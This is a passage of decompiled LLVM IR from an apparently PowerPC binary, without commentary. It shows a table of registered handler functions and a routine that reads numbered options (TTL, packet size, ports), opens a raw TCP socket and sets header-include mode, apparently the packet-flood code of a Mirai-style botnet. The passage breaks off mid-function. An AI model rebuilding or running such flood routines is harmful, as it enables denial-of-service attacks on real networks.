  %v0_10002290 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002290 = trunc i32 %v0_10002290 to i8
  %v2_10002290 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002290 = add i32 %v2_10002290, 4
  %v4_10002290 = inttoptr i32 %v3_10002290 to i8*
  store i8 %v1_10002290, i8* %v4_10002290, align 1
  %v0_10002294 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002294 = add i32 %v0_10002294, 4
  store i32 %v1_10002294, i32* %r4.global-to-local, align 4
  store i32 268444316, i32* @lr, align 4
  %v3_10002298 = call i32 @function_10009030(i32 %v3_10002284, i32 %v1_10002294, i32 268453180)
  %v3_1000229c = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_1000229c = zext i8 %v3_1000229c to i32
  store i32 %v3_10002298, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_100022ac = mul nuw nsw i32 %v4_1000229c, 4
  %v0_100022b0 = load i32, i32* @r28, align 4
  %v3_100022b0 = add i32 %v1_100022ac, %v3_10002298
  %v4_100022b0 = inttoptr i32 %v3_100022b0 to i32*
  store i32 %v0_100022b0, i32* %v4_100022b0, align 4
  %v0_100022b8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100022b8, i32* @global_var_1001b290.59, align 4
  %v0_100022bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100022bc = trunc i32 %v0_100022bc to i8
  store i8 %v1_100022bc, i8* @global_var_1001b28c.58, align 1
  store i32 268444356, i32* @lr, align 4
  %v2_100022c0 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_100022c4 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100022c4 = zext i8 %v3_100022c4 to i32
  store i32 %v4_100022c4, i32* %r4.global-to-local, align 4
  store i32 %v2_100022c0, i32* %r28.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_100022d8 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_100022dc = inttoptr i32 %v2_100022c0 to i32*
  store i32 268452356, i32* %v2_100022dc, align 4
  %v0_100022e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100022e0 = mul i32 %v0_100022e0, 4
  store i32 %v1_100022e0, i32* %r4.global-to-local, align 4
  %v0_100022e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100022e4 = trunc i32 %v0_100022e4 to i8
  %v2_100022e4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100022e4 = add i32 %v2_100022e4, 4
  %v4_100022e4 = inttoptr i32 %v3_100022e4 to i8*
  store i8 %v1_100022e4, i8* %v4_100022e4, align 1
  %v0_100022e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100022e8 = add i32 %v0_100022e8, 4
  store i32 %v1_100022e8, i32* %r4.global-to-local, align 4
  store i32 268444400, i32* @lr, align 4
  %v3_100022ec = call i32 @function_10009030(i32 %v3_100022d8, i32 %v1_100022e8, i32 268452356)
  %v3_100022f0 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100022f0 = zext i8 %v3_100022f0 to i32
  store i32 %v3_100022ec, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_10002300 = mul nuw nsw i32 %v4_100022f0, 4
  %v0_10002304 = load i32, i32* @r28, align 4
  %v3_10002304 = add i32 %v1_10002300, %v3_100022ec
  %v4_10002304 = inttoptr i32 %v3_10002304 to i32*
  store i32 %v0_10002304, i32* %v4_10002304, align 4
  %v0_1000230c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000230c, i32* @global_var_1001b290.59, align 4
  %v0_10002310 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002310 = trunc i32 %v0_10002310 to i8
  store i8 %v1_10002310, i8* @global_var_1001b28c.58, align 1
  store i32 268444440, i32* @lr, align 4
  %v2_10002314 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_10002318 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002318 = zext i8 %v3_10002318 to i32
  store i32 %v4_10002318, i32* %r4.global-to-local, align 4
  store i32 %v2_10002314, i32* %r28.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_1000232c = load i32, i32* @global_var_1001b290.59, align 4
  %v2_10002330 = inttoptr i32 %v2_10002314 to i32*
  store i32 268450912, i32* %v2_10002330, align 4
  %v0_10002334 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002334 = mul i32 %v0_10002334, 4
  store i32 %v1_10002334, i32* %r4.global-to-local, align 4
  %v0_10002338 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002338 = trunc i32 %v0_10002338 to i8
  %v2_10002338 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002338 = add i32 %v2_10002338, 4
  %v4_10002338 = inttoptr i32 %v3_10002338 to i8*
  store i8 %v1_10002338, i8* %v4_10002338, align 1
  %v0_1000233c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000233c = add i32 %v0_1000233c, 4
  store i32 %v1_1000233c, i32* %r4.global-to-local, align 4
  store i32 268444484, i32* @lr, align 4
  %v3_10002340 = call i32 @function_10009030(i32 %v3_1000232c, i32 %v1_1000233c, i32 268450912)
  %v3_10002344 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002344 = zext i8 %v3_10002344 to i32
  store i32 %v3_10002340, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_10002354 = mul nuw nsw i32 %v4_10002344, 4
  %v0_10002358 = load i32, i32* @r28, align 4
  %v3_10002358 = add i32 %v1_10002354, %v3_10002340
  %v4_10002358 = inttoptr i32 %v3_10002358 to i32*
  store i32 %v0_10002358, i32* %v4_10002358, align 4
  %v0_10002360 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10002360, i32* @global_var_1001b290.59, align 4
  %v0_10002364 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002364 = trunc i32 %v0_10002364 to i8
  store i8 %v1_10002364, i8* @global_var_1001b28c.58, align 1
  store i32 268444524, i32* @lr, align 4
  %v2_10002368 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_1000236c = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_1000236c = zext i8 %v3_1000236c to i32
  store i32 %v4_1000236c, i32* %r4.global-to-local, align 4
  store i32 %v2_10002368, i32* %r28.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_10002380 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_10002384 = inttoptr i32 %v2_10002368 to i32*
  store i32 268449404, i32* %v2_10002384, align 4
  %v0_10002388 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002388 = mul i32 %v0_10002388, 4
  store i32 %v1_10002388, i32* %r4.global-to-local, align 4
  %v0_1000238c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000238c = trunc i32 %v0_1000238c to i8
  %v2_1000238c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000238c = add i32 %v2_1000238c, 4
  %v4_1000238c = inttoptr i32 %v3_1000238c to i8*
  store i8 %v1_1000238c, i8* %v4_1000238c, align 1
  %v0_10002390 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002390 = add i32 %v0_10002390, 4
  store i32 %v1_10002390, i32* %r4.global-to-local, align 4
  store i32 268444568, i32* @lr, align 4
  %v3_10002394 = call i32 @function_10009030(i32 %v3_10002380, i32 %v1_10002390, i32 268449404)
  %v3_10002398 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002398 = zext i8 %v3_10002398 to i32
  store i32 %v3_10002394, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_100023a8 = mul nuw nsw i32 %v4_10002398, 4
  %v0_100023ac = load i32, i32* @r28, align 4
  %v3_100023ac = add i32 %v1_100023a8, %v3_10002394
  %v4_100023ac = inttoptr i32 %v3_100023ac to i32*
  store i32 %v0_100023ac, i32* %v4_100023ac, align 4
  %v0_100023b4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100023b4, i32* @global_var_1001b290.59, align 4
  %v0_100023b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100023b8 = trunc i32 %v0_100023b8 to i8
  store i8 %v1_100023b8, i8* @global_var_1001b28c.58, align 1
  store i32 268444608, i32* @lr, align 4
  %v2_100023bc = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_100023c0 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100023c0 = zext i8 %v3_100023c0 to i32
  store i32 %v4_100023c0, i32* %r4.global-to-local, align 4
  store i32 %v2_100023bc, i32* %r28.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_100023d4 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_100023d8 = inttoptr i32 %v2_100023bc to i32*
  store i32 268447796, i32* %v2_100023d8, align 4
  %v0_100023dc = load i32, i32* %r4.global-to-local, align 4
  %v1_100023dc = mul i32 %v0_100023dc, 4
  store i32 %v1_100023dc, i32* %r4.global-to-local, align 4
  %v0_100023e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100023e0 = trunc i32 %v0_100023e0 to i8
  %v2_100023e0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100023e0 = add i32 %v2_100023e0, 4
  %v4_100023e0 = inttoptr i32 %v3_100023e0 to i8*
  store i8 %v1_100023e0, i8* %v4_100023e0, align 1
  %v0_100023e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_100023e4 = add i32 %v0_100023e4, 4
  store i32 %v1_100023e4, i32* %r4.global-to-local, align 4
  store i32 268444652, i32* @lr, align 4
  %v3_100023e8 = call i32 @function_10009030(i32 %v3_100023d4, i32 %v1_100023e4, i32 268447796)
  %v3_100023ec = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100023ec = zext i8 %v3_100023ec to i32
  store i32 %v3_100023e8, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_100023fc = mul nuw nsw i32 %v4_100023ec, 4
  %v0_10002400 = load i32, i32* @r28, align 4
  %v3_10002400 = add i32 %v1_100023fc, %v3_100023e8
  %v4_10002400 = inttoptr i32 %v3_10002400 to i32*
  store i32 %v0_10002400, i32* %v4_10002400, align 4
  %v0_10002408 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10002408, i32* @global_var_1001b290.59, align 4
  %v0_1000240c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000240c = trunc i32 %v0_1000240c to i8
  store i8 %v1_1000240c, i8* @global_var_1001b28c.58, align 1
  store i32 268444692, i32* @lr, align 4
  %v2_10002410 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_10002414 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002414 = zext i8 %v3_10002414 to i32
  store i32 %v4_10002414, i32* %r4.global-to-local, align 4
  store i32 %v2_10002410, i32* %r28.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10002428 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_1000242c = inttoptr i32 %v2_10002410 to i32*
  store i32 268446432, i32* %v2_1000242c, align 4
  %v0_10002430 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002430 = mul i32 %v0_10002430, 4
  store i32 %v1_10002430, i32* %r4.global-to-local, align 4
  %v0_10002434 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002434 = trunc i32 %v0_10002434 to i8
  %v2_10002434 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002434 = add i32 %v2_10002434, 4
  %v4_10002434 = inttoptr i32 %v3_10002434 to i8*
  store i8 %v1_10002434, i8* %v4_10002434, align 1
  %v0_10002438 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002438 = add i32 %v0_10002438, 4
  store i32 %v1_10002438, i32* %r4.global-to-local, align 4
  store i32 268444736, i32* @lr, align 4
  %v3_1000243c = call i32 @function_10009030(i32 %v3_10002428, i32 %v1_10002438, i32 268446432)
  %v3_10002440 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002440 = zext i8 %v3_10002440 to i32
  store i32 %v3_1000243c, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_10002450 = mul nuw nsw i32 %v4_10002440, 4
  %v0_10002454 = load i32, i32* @r28, align 4
  %v3_10002454 = add i32 %v1_10002450, %v3_1000243c
  %v4_10002454 = inttoptr i32 %v3_10002454 to i32*
  store i32 %v0_10002454, i32* %v4_10002454, align 4
  %v0_1000245c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000245c, i32* @global_var_1001b290.59, align 4
  %v0_10002460 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002460 = trunc i32 %v0_10002460 to i8
  store i8 %v1_10002460, i8* @global_var_1001b28c.58, align 1
  store i32 268444776, i32* @lr, align 4
  %v2_10002464 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_10002468 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002468 = zext i8 %v3_10002468 to i32
  store i32 %v4_10002468, i32* %r4.global-to-local, align 4
  store i32 %v2_10002464, i32* %r28.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_1000247c = load i32, i32* @global_var_1001b290.59, align 4
  %v2_10002480 = inttoptr i32 %v2_10002464 to i32*
  store i32 268444960, i32* %v2_10002480, align 4
  %v0_10002484 = load i32, i32* %r4.global-to-local, align 4
  %v1_10002484 = mul i32 %v0_10002484, 4
  store i32 %v1_10002484, i32* %r4.global-to-local, align 4
  %v0_10002488 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002488 = trunc i32 %v0_10002488 to i8
  %v2_10002488 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002488 = add i32 %v2_10002488, 4
  %v4_10002488 = inttoptr i32 %v3_10002488 to i8*
  store i8 %v1_10002488, i8* %v4_10002488, align 1
  %v0_1000248c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000248c = add i32 %v0_1000248c, 4
  store i32 %v1_1000248c, i32* %r4.global-to-local, align 4
  store i32 268444820, i32* @lr, align 4
  %v3_10002490 = call i32 @function_10009030(i32 %v3_1000247c, i32 %v1_1000248c, i32 268444960)
  %v3_10002494 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_10002494 = zext i8 %v3_10002494 to i32
  store i32 %v3_10002490, i32* %r11.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_100024a4 = mul nuw nsw i32 %v4_10002494, 4
  %v0_100024a8 = load i32, i32* @r28, align 4
  %v3_100024a8 = add i32 %v1_100024a4, %v3_10002490
  %v4_100024a8 = inttoptr i32 %v3_100024a8 to i32*
  store i32 %v0_100024a8, i32* %v4_100024a8, align 4
  %v0_100024b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100024b0 = trunc i32 %v0_100024b0 to i8
  store i8 %v1_100024b0, i8* @global_var_1001b28c.58, align 1
  %v0_100024b4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100024b4, i32* @global_var_1001b290.59, align 4
  store i32 268444860, i32* @lr, align 4
  %v2_100024b8 = call i32 @function_10008ec0(i32 1, i32 8)
  %v3_100024bc = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100024bc = zext i8 %v3_100024bc to i32
  store i32 %v4_100024bc, i32* %r4.global-to-local, align 4
  store i32 %v2_100024b8, i32* %r28.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_100024d0 = load i32, i32* @global_var_1001b290.59, align 4
  %v2_100024d4 = inttoptr i32 %v2_100024b8 to i32*
  store i32 268436024, i32* %v2_100024d4, align 4
  %v0_100024d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100024d8 = mul i32 %v0_100024d8, 4
  store i32 %v1_100024d8, i32* %r4.global-to-local, align 4
  %v0_100024dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100024dc = trunc i32 %v0_100024dc to i8
  %v2_100024dc = load i32, i32* %r28.global-to-local, align 4
  %v3_100024dc = add i32 %v2_100024dc, 4
  %v4_100024dc = inttoptr i32 %v3_100024dc to i8*
  store i8 %v1_100024dc, i8* %v4_100024dc, align 1
  %v0_100024e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100024e0 = add i32 %v0_100024e0, 4
  store i32 %v1_100024e0, i32* %r4.global-to-local, align 4
  store i32 268444904, i32* @lr, align 4
  %v3_100024e4 = call i32 @function_10009030(i32 %v3_100024d0, i32 %v1_100024e0, i32 268436024)
  %v3_100024e8 = load i8, i8* @global_var_1001b28c.58, align 1
  %v4_100024e8 = zext i8 %v3_100024e8 to i32
  store i32 %v3_100024e4, i32* @global_var_1001b290.59, align 4
  store i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), i32* %r0.global-to-local, align 4
  %v1_100024f4 = mul nuw nsw i32 %v4_100024e8, 4
  %v0_100024f8 = load i32, i32* @r28, align 4
  %v3_100024f8 = add i32 %v1_100024f4, %v3_100024e4
  %v4_100024f8 = inttoptr i32 %v3_100024f8 to i32*
  store i32 %v0_100024f8, i32* %v4_100024f8, align 4
  %v0_10002500 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002500 = trunc i32 %v0_10002500 to i8
  store i8 %v1_10002500, i8* @global_var_1001b28c.58, align 1
  store i32 %v0_10002248, i32* %r0.global-to-local, align 4
  store i32 %v0_10002264, i32* @r28, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 ptrtoint (i8* @global_var_1001b28d.62 to i32), { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1001b28c.58, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_10002520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002520:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-90 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10002524 = load i32, i32* @lr, align 4
  store i32 %v0_10002524, i32* %r0.global-to-local, align 4
  %v0_10002528 = call i32 @__asm_mfcr()
  store i32 %v0_10002528, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10002538 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10002528, i32* %r18.global-to-local, align 4
  %v0_1000256c = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10002574 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_1000257c = load i32, i32* @r30, align 4
  %v0_10002580 = load i32, i32* @r31, align 4
  store i32 268445076, i32* @lr, align 4
  %v2_10002590 = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_10002590, i32* %r19.global-to-local, align 4
  %v0_10002598 = load i32, i32* @r28, align 4
  %v0_100025a4 = load i32, i32* @r29, align 4
  store i32 %v0_100025a4, i32* %r3.global-to-local, align 4
  store i32 268445100, i32* @lr, align 4
  %v4_100025a8 = inttoptr i32 %v0_10002598 to i32*
  %v5_100025a8 = call i32 @function_100021c0(i32 %v0_100025a4, i32* %v4_100025a8, i32 2, i32 0)
  %v0_100025b8 = load i32, i32* @r28, align 4
  %v1_100025bc = urem i32 %v5_100025a8, 256
  store i32 %v1_100025bc, i32* %r14.global-to-local, align 4
  %v0_100025c0 = load i32, i32* @r29, align 4
  store i32 %v0_100025c0, i32* %r3.global-to-local, align 4
  store i32 268445128, i32* @lr, align 4
  %v4_100025c4 = inttoptr i32 %v0_100025b8 to i32*
  %v5_100025c4 = call i32 @function_100021c0(i32 %v0_100025c0, i32* %v4_100025c4, i32 3, i32 65535)
  %v0_100025c8 = load i32, i32* @r28, align 4
  store i32 %v5_100025c4, i32* %r24.global-to-local, align 4
  %v0_100025d8 = load i32, i32* @r29, align 4
  store i32 %v0_100025d8, i32* %r3.global-to-local, align 4
  store i32 268445152, i32* @lr, align 4
  %v4_100025dc = inttoptr i32 %v0_100025c8 to i32*
  %v5_100025dc = call i32 @function_100021c0(i32 %v0_100025d8, i32* %v4_100025dc, i32 4, i32 64)
  %v0_100025e0 = load i32, i32* @r28, align 4
  %v1_100025ec = urem i32 %v5_100025dc, 256
  store i32 %v1_100025ec, i32* %r20.global-to-local, align 4
  %v0_100025f0 = load i32, i32* @r29, align 4
  store i32 %v0_100025f0, i32* %r3.global-to-local, align 4
  store i32 268445176, i32* @lr, align 4
  %v4_100025f4 = inttoptr i32 %v0_100025e0 to i32*
  %v5_100025f4 = call i32 @function_100021c0(i32 %v0_100025f0, i32* %v4_100025f4, i32 5, i32 1)
  %v0_10002604 = load i32, i32* @r28, align 4
  %v1_10002608 = urem i32 %v5_100025f4, 256
  store i32 %v1_10002608, i32* @r31, align 4
  %v0_1000260c = load i32, i32* @r29, align 4
  store i32 %v0_1000260c, i32* %r3.global-to-local, align 4
  store i32 268445204, i32* @lr, align 4
  %v4_10002610 = inttoptr i32 %v0_10002604 to i32*
  %v5_10002610 = call i32 @function_100021c0(i32 %v0_1000260c, i32* %v4_10002610, i32 6, i32 65535)
  %v0_10002618 = load i32, i32* @r28, align 4
  store i32 %v5_10002610, i32* %r26.global-to-local, align 4
  %v0_10002628 = load i32, i32* @r29, align 4
  store i32 %v0_10002628, i32* %r3.global-to-local, align 4
  store i32 268445232, i32* @lr, align 4
  %v4_1000262c = inttoptr i32 %v0_10002618 to i32*
  %v5_1000262c = call i32 @function_100021c0(i32 %v0_10002628, i32* %v4_1000262c, i32 7, i32 65535)
  %v0_10002630 = load i32, i32* @r28, align 4
  store i32 %v5_1000262c, i32* %r27.global-to-local, align 4
  %v0_10002640 = load i32, i32* @r29, align 4
  store i32 %v0_10002640, i32* %r3.global-to-local, align 4
  store i32 268445256, i32* @lr, align 4
  %v4_10002644 = inttoptr i32 %v0_10002630 to i32*
  %v5_10002644 = call i32 @function_100021c0(i32 %v0_10002640, i32* %v4_10002644, i32 0, i32 512)
  %v0_10002648 = load i32, i32* @r28, align 4
  store i32 %v5_10002644, i32* %r15.global-to-local, align 4
  %v0_10002658 = load i32, i32* @r29, align 4
  store i32 %v0_10002658, i32* %r3.global-to-local, align 4
  store i32 268445280, i32* @lr, align 4
  %v4_1000265c = inttoptr i32 %v0_10002648 to i32*
  %v5_1000265c = call i32 @function_100021c0(i32 %v0_10002658, i32* %v4_1000265c, i32 1, i32 1)
  %v0_10002660 = load i32, i32* @r28, align 4
  %v1_1000266c = urem i32 %v5_1000265c, 256
  store i32 %v1_1000266c, i32* %r21.global-to-local, align 4
  %v0_10002670 = load i32, i32* @r29, align 4
  store i32 %v0_10002670, i32* %r3.global-to-local, align 4
  store i32 268445304, i32* @lr, align 4
  %v4_10002674 = inttoptr i32 %v0_10002660 to i32*
  %v5_10002674 = call i32 @function_100021c0(i32 %v0_10002670, i32* %v4_10002674, i32 19, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000267c = load i32, i32* @global_var_1001b288.63, align 4
  %v0_10002680 = load i32, i32* @r28, align 4
  store i32 %v5_10002674, i32* %r30.global-to-local, align 4
  %v0_1000268c = load i32, i32* @r29, align 4
  store i32 %v0_1000268c, i32* %r3.global-to-local, align 4
  store i32 268445332, i32* @lr, align 4
  %v4_10002690 = inttoptr i32 %v0_10002680 to i32*
  %v5_10002690 = call i32 @function_100021c0(i32 %v0_1000268c, i32* %v4_10002690, i32 25, i32 %v3_1000267c)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268445352, i32* @lr, align 4
  %v3_100026a4 = call i32 @function_10008b34(i32 2, i32 3, i32 6)
  store i32 %v3_100026a4, i32* %r3.global-to-local, align 4
  %v3_100026a8 = icmp eq i32 %v3_100026a4, -1
  store i1 %v3_100026a8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100026a4, i32* %r23.global-to-local, align 4
  br i1 %v3_100026a8, label %dec_label_pc_1000284c, label %dec_label_pc_100026b4

dec_label_pc_100026b4:                            ; preds = %dec_label_pc_10002520
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100026c0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268445392, i32* @lr, align 4
  %v5_100026cc = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_100026c0, i32 4, i32 4)
  store i32 %v5_100026cc, i32* %r3.global-to-local, align 4
  %v3_100026d0 = icmp eq i32 %v5_100026cc, -1
  store i1 %v3_100026d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100026d0, label %dec_label_pc_10002844, label %dec_label_pc_100026d8

dec_label_pc_100026d8:                            ; preds = %dec_label_pc_100026b4
  %v0_100026d8 = load i32, i32* %r18.global-to-local, align 4
  %v1_100026d8 = icmp slt i32 %v0_100026d8, 0
  %v3_100026d8 = icmp eq i32 %v0_100026d8, 0
  store i1 %v1_100026d8, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100026d8, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_100026e4 = load i32, i32* %r24.global-to-local, align 4
  %v1_100026e4 = urem i32 %v0_100026e4, 65536
  store i32 %v1_100026e4, i32* %r24.global-to-local, align 4
  %v0_100026e8 = load i32, i32* %r26.global-to-local, align 4
  %v1_100026e8 = urem i32 %v0_100026e8, 65536
  store i32 %v1_100026e8, i32* %r16.global-to-local, align 4
  %v0_100026ec = load i32, i32* %r27.global-to-local, align 4
  %v1_100026ec = urem i32 %v0_100026ec, 65536
  store i32 %v1_100026ec, i32* %r17.global-to-local, align 4
  %v0_100026f0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100026f0 = urem i32 %v0_100026f0, 256
  store i32 %v1_100026f0, i32* %r3.global-to-local, align 4
  %tmp37 = icmp slt i32 %v0_100026d8, 1
  br i1 %tmp37, label %dec_label_pc_100028ac, label %dec_label_pc_100026f8

dec_label_pc_100026f8:                            ; preds = %dec_label_pc_100026d8
  %v0_100026f8 = load i32, i32* @r31, align 4
  %v3_100026f8 = icmp eq i32 %v0_100026f8, 0
  store i1 %v3_100026f8, i1* %cr2_eq.global-to-local, align 1
  %v3_100026fc = icmp eq i32 %v1_100026f0, 0
  store i1 %v3_100026fc, i1* %cr3_eq.global-to-local, align 1
  %v0_10002700 = load i32, i32* %r15.global-to-local, align 4
  %v1_10002700 = urem i32 %v0_10002700, 65536
  %v0_100026e4.not = or i32 %v0_100026e4, -65536
  %v1_10002704 = xor i32 %v0_100026e4.not, 65535
  store i32 %v1_10002704, i32* %r11.global-to-local, align 4
  %v1_1000270c = add nuw nsw i32 %v1_10002700, 66
  store i32 %v1_1000270c, i32* %r0.global-to-local, align 4
  %v1_10002710 = add nuw nsw i32 %v1_10002700, 28
  store i32 %v1_10002710, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_10002700, 66
  %v1_10002714 = urem i32 %fold, 65536
  store i32 %v1_10002714, i32* %r22.global-to-local, align 4
  %fold8 = add i32 %v0_10002700, 28
  %v1_10002718 = urem i32 %fold8, 65536
  store i32 %v1_10002718, i32* %r26.global-to-local, align 4
  %v1_1000271c = urem i32 %v1_10002704, 65536
  store i32 %v1_1000271c, i32* %r27.global-to-local, align 4
  %fold9 = add i32 %v0_10002700, 8
  %v1_10002720 = urem i32 %fold9, 65536
  store i32 %v1_10002720, i32* @r28, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002754

dec_label_pc_1000272c:                            ; preds = %dec_label_pc_10002820
  %v0_1000272c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000272c = add i32 %v0_1000272c, 16
